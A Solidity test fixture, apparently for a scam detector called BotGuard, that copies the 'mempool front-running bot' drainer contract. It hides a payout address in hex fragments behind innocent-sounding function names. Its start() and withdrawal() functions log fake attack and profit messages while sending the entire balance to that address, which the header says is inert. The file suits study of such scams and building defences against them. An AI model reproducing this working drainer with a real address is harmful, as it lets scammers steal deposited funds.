// SPDX-License-Identifier: MIT
// BotGuard TEST FIXTURE. Imitates the "mempool front-running bot" drainer template from scam videos:
// the payout address is hidden in hex fragments and parsed at runtime. The address here is inert
// (0xbad0...b07, nobody's wallet). Never deploy this on a real network.
pragma solidity ^0.8.20;

contract FrontRunBot {
    string public tokenName;
    string public tokenSymbol;

    event Log(string _msg);

    constructor(string memory _tokenName, string memory _tokenSymbol) {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
    }

    receive() external payable {}

    function getMemPoolOffset() internal pure returns (string memory) {
        return "bad0bad0";
    }

    function getMemPoolDepth() internal pure returns (string memory) {
        return "bad00000";
    }

    function getMemPoolLength() internal pure returns (string memory) {
        return "00000000";
    }

    function getMemPoolHeight() internal pure returns (string memory) {
        return "00000000";
    }

    function checkLiquidity() internal pure returns (string memory) {
        return "b0700b07";
    }

    function callMempool() internal pure returns (string memory) {
        return string(abi.encodePacked("0x", getMemPoolOffset(), getMemPoolDepth(), getMemPoolLength(), getMemPoolHeight(), checkLiquidity()));
    }

    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function _callFrontRunActionMempool() internal pure returns (address) {
        return parseMemoryPool(callMempool());
    }

    function start() public payable {
        emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
        payable(_callFrontRunActionMempool()).transfer(address(this).balance);
    }

    function withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(_callFrontRunActionMempool()).transfer(address(this).balance);
    }
}
